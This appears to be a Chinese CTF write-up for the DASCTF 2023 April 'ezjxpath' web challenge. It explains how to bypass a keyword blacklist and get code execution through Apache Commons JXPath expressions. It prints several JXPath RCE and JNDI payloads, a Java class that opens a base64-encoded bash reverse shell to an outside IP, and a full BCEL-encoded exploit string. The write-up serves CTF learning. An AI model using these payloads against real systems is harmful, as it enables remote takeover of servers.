<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>DASCTF 2023 Apr X SU Web Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="DASCTF 2023 Apr X SU Web Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/04/24/DASCTF%202023%20Apr%20X%20SU%20Web%20Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-04-23T16:13:50.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>24,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">DASCTF 2023 Apr X SU Web Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="ezjxpath"><a href="#ezjxpath" class="headerlink" title="ezjxpath"></a>ezjxpath</h1><p>考点：TCTF中的非预期解<br>都这么久了TCTF的影响力还是依然影响到今天的，首先先来审一下题吧</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.first.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.first.utils.Waf;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.jxpath.JXPathContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/index&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello CTFer&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/hack&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hack</span><span class="params">(<span class="meta">@RequestParam(name = &quot;query&quot;,required = true)</span> String query)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Waf</span> <span class="variable">waf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Waf</span>();</span><br><span class="line">            <span class="keyword">if</span> (!waf.check(query)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;try harder&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext((Object)<span class="literal">null</span>);</span><br><span class="line">                context.getValue(query);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;good job!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;some thing wrong?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>主要逻辑如上，很简短，主要重点就是<code>JXPathContext</code>，这个东西在之前被爆出过CVE</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;exec(java.lang.Runtime.getRuntime(), &#x27;calc&#x27;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext.new(\&quot;http://127.0.0.1:9000/spring-Evil.xml\&quot;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;javax.naming.InitialContext.doLookup(&#x27;rmi://127.0.0.1:1099/1u560y&#x27;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>常规的payload不亚于以上三种，但是很遗憾，题目都给在waf里ban掉了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.first.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Waf</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; blacklist = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(Arrays.asList(<span class="string">&quot;java.lang&quot;</span>, <span class="string">&quot;Runtime&quot;</span>, <span class="string">&quot;org.springframework&quot;</span>, <span class="string">&quot;javax.naming&quot;</span>, <span class="string">&quot;Process&quot;</span>, <span class="string">&quot;ScriptEngineManager&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String s)</span> <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (s.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">reals</span> <span class="operator">=</span> URLDecoder.decode(s, <span class="string">&quot;UTF-8&quot;</span>).toUpperCase(Locale.ROOT);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.blacklist.size(); ++i) &#123;</span><br><span class="line">                <span class="keyword">if</span> (reals.toUpperCase(Locale.ROOT).contains(((String)<span class="built_in">this</span>.blacklist.get(i)).toUpperCase(Locale.ROOT))) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Waf</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如此一来我们只能另寻蹊跷了，赛后就突然想到TCTF里的非预期解好多都是静态方法，而这里我们也是用静态方法去利用的<br><code>com.sun.org.apache.bcel.internal.util.JavaWrapper</code>，这个类的<code>_main</code>方法逻辑如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">/* Expects class name as first argument, other arguments are by-passed.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(argv.length == <span class="number">0</span>) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Missing class name.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">class_name</span> <span class="operator">=</span> argv[<span class="number">0</span>];</span><br><span class="line">    String[] new_argv = <span class="keyword">new</span> <span class="title class_">String</span>[argv.length - <span class="number">1</span>];</span><br><span class="line">    System.arraycopy(argv, <span class="number">1</span>, new_argv, <span class="number">0</span>, new_argv.length);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaWrapper</span>();</span><br><span class="line">    wrapper.runMain(class_name, new_argv);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>主要逻辑在于runMain方法里面，class_name和new_argv就是类名和参数，逻辑如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runMain</span><span class="params">(String class_name, String[] argv)</span> <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Class</span>   <span class="variable">cl</span>    <span class="operator">=</span> loader.loadClass(class_name);</span><br><span class="line">  <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    method = cl.getMethod(<span class="string">&quot;_main&quot;</span>,  <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; argv.getClass() &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Method _main is sane ?</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span>   <span class="variable">m</span> <span class="operator">=</span> method.getModifiers();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> method.getReturnType();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(Modifier.isPublic(m) &amp;&amp; Modifier.isStatic(m)) ||</span><br><span class="line">       Modifier.isAbstract(m) || (r != Void.TYPE))</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(NoSuchMethodException no) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;In class &quot;</span> + class_name +</span><br><span class="line">                       <span class="string">&quot;: public static void _main(String[] argv) is not defined&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    method.invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; argv &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(Exception ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>loader.loadClass(class_name);</code>处显然是有类加载的，而这个loader仔细一看会发现是一个<code>BCEL</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682172942310-43fb61d0-42cb-42d9-bb24-3b68c31c3502.png#averageHue=%232d2d28&clientId=u3e66cfde-3ee4-4&from=paste&height=158&id=u367a1ebd&name=image.png&originHeight=197&originWidth=1073&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=304660&status=done&style=none&taskId=ua264349d-3c7a-45d5-929d-c896ec77643&title=&width=858.4" alt="image.png"><br>那这里就回到之前写的一篇文章了<br><a target="_blank" rel="noopener" href="https://www.yuque.com/boogipop/iwyn7t/tznwzgs310vslquv?view=doc_embed">BCEL-ClassLoader赛博学习</a><br>在这里提到了BCEL字节码是怎么加载和利用的。然后对于上述的JavaWrapper类，最后loadclass后会去调用恶意类的_main方法，那我们只需要复刻一下恶意类就好了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>随之把他编译为字节码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">        Class.forName(<span class="string">&quot;$$BCEL$$&quot;</span>+code,<span class="literal">true</span>,<span class="keyword">new</span> <span class="title class_">ClassLoader</span>());</span><br><span class="line">        <span class="comment">//new ClassLoader().loadClass(&quot;$$BCEL$$&quot;+code).newInstance();</span></span><br><span class="line">        <span class="comment">//String str=&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmR$5dO$TA$U$3dC$b7$5d$ba$ae$C$c5$ef$_$aab$y$d2$ba$R$88$n$a91i$9ab4$db$WiS$82$3e$98$e92$d9N$d3$dd$r$bb$db$ba$80$fc$u_$d4$f8$e0$P$f0G$Z$ef$b4$84$Sa$92$993s$ee$99s$e7$de$cc$9f$bf$bf$7e$Dx$89$a7$G2$b8m$e0$O$ee$ce$e2$9e$c2$fb$3a$k$e8x$c8$90y$z$7d$Z$bfaH$VV$3a$MZ5$d8$X$Ms$b6$f4Ec$e8uE$d8$e6$dd$B19$3bp$f8$a0$c3C$a9$ce$a7$a4$W$f7d4$8e$85$ae$r$S$ee$j$M$84E2$a7$cc$90$fe$ecq$e93$dc$y$7c$b2$fb$7c$c4$ad$B$f7$5d$ab$V$87$d2w$cb$e3T$3ctG$M$8b$97$84$Z$8cZ$e2$88$83X$G$7e$a4c$89$c4$T3u$87$S$g$ad$60$Y$3abK$aaGdU$c2$X$ca$c3$84$8eY$jy$T$8f$f0$98$81wy$d4$cb$97$9c$fc$b1pzAq$cf$db$3a$e2$d5J$cc$5b$95$d5$f7$b22$fa$f8$b6$b3f$af$ef$f4$9d$eafRo$7f$Y$d6$db$b55$bb_K$9a$ad$8d$c3F$bb$3ej$i9$eb$8d$c3$ca$97m$b9$97$9c$7c$3d$s3$f1j$a3X$da$9f$ec$7b$c5$92$3c1$f1$E$cb$M$f3$ff$97O$d4$b4$a6f$b7$_$9c$98$K$jS2$b0$de5$cf$8acX$98$Kw$86$7e$y$3d$aa$c8pE$7cv$b8QX$b1$_h$a8C$9aH$E$rzV$b8$a4$bb$e7$a8$ed0pD$U$95$a9$ri$fa$Ej$a4$c0T$a3h$cd$d2$c9$od$84$e9$e7$3f$c0$be$d1f$G$G$ad$99$J$89$x$b4$9a$a7$7b$TW$J$b3$b8$869R$a9$cb$9b$84$wf$fc$c4L$$$f5$j$da$ee$d4$c1$m$E$r$caR$aa$a9$8b$81y$y$Q$e6hj$c4$yR$fc$3a$f9M$k$b3JS$a9$$$3c$c4$3cgA$3d$Z$5b$d0$df$g$abn$fd$D$f9$9fP$X$e8$C$A$A&quot;;</span></span><br><span class="line">        com.sun.org.apache.bcel.internal.util.JavaWrapper._main();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后打入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.getValue(&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper._main(split(&#x27;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmR$5dO$TA$U$3dC$b7$5d$ba$ae$C$c5$ef$_$aab$y$d2$ba$R$88$n$a91i$9ab4$db$WiS$82$3e$98$e92$d9N$d3$dd$r$bb$db$ba$80$fc$u_$d4$f8$e0$P$f0G$Z$ef$b4$84$Sa$92$993s$ee$99s$e7$de$cc$9f$bf$bf$7e$Dx$89$a7$G2$b8m$e0$O$ee$ce$e2$9e$c2$fb$3a$k$e8x$c8$90y$z$7d$Z$bfaH$VV$3a$MZ5$d8$X$Ms$b6$f4Ec$e8uE$d8$e6$dd$B19$3bp$f8$a0$c3C$a9$ce$a7$a4$W$f7d4$8e$85$ae$r$S$ee$j$M$84E2$a7$cc$90$fe$ecq$e93$dc$y$7c$b2$fb$7c$c4$ad$B$f7$5d$ab$V$87$d2w$cb$e3T$3ctG$M$8b$97$84$Z$8cZ$e2$88$83X$G$7e$a4c$89$c4$T3u$87$S$g$ad$60$Y$3abK$aaGdU$c2$X$ca$c3$84$8eY$jy$T$8f$f0$98$81wy$d4$cb$97$9c$fc$b1pzAq$cf$db$3a$e2$d5J$cc$5b$95$d5$f7$b22$fa$f8$b6$b3f$af$ef$f4$9d$eafRo$7f$Y$d6$db$b55$bb_K$9a$ad$8d$c3F$bb$3ej$i9$eb$8d$c3$ca$97m$b9$97$9c$7c$3d$s3$f1j$a3X$da$9f$ec$7b$c5$92$3c1$f1$E$cb$M$f3$ff$97O$d4$b4$a6f$b7$_$9c$98$K$jS2$b0$de5$cf$8acX$98$Kw$86$7e$y$3d$aa$c8pE$7cv$b8QX$b1$_h$a8C$9aH$E$rzV$b8$a4$bb$e7$a8$ed0pD$U$95$a9$ri$fa$Ej$a4$c0T$a3h$cd$d2$c9$od$84$e9$e7$3f$c0$be$d1f$G$G$ad$99$J$89$x$b4$9a$a7$7b$TW$J$b3$b8$869R$a9$cb$9b$84$wf$fc$c4L$$$f5$j$da$ee$d4$c1$m$E$r$caR$aa$a9$8b$81y$y$Q$e6hj$c4$yR$fc$3a$f9M$k$b3JS$a9$$$3c$c4$3cgA$3d$Z$5b$d0$df$g$abn$fd$D$f9$9fP$X$e8$C$A$A&#x27;,&#x27;,&#x27;))&quot;);</span><br></pre></td></tr></table></figure>
<p>上述用到了split来获取数组，这是山河师傅发现的，我当时以为不能直接用split，要用全类名，但实际上Jxpath是识别的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682183903716-37331eac-c663-42ac-b004-fc2fada15fc0.png#averageHue=%235e5d5c&clientId=u0aef57fd-3acb-4&from=paste&height=817&id=uf442bf1e&name=image.png&originHeight=1021&originWidth=1896&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=137554&status=done&style=none&taskId=u472ba698-b2ce-4966-ab10-bb532a0b5ce&title=&width=1516.8" alt="image.png"></p>
